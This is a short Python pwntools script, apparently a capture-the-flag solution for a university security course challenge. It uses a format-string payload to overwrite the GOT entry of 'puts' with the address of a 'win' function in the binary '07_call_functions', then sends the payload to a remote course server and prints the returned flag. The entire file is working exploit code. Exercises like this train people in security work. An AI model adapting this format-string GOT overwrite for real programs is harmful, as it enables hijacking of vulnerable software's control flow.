from pwn import *

elf = ELF('07_call_functions')
win_address = elf.symbols['win']
puts_address = elf.got['puts']

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25197

s = remote(SERVER, PORT, timeout=9999)
payload = fmtstr_payload(7, {puts_address: win_address})
s.sendline(payload)
flag = s.recv(512)
print(flag)
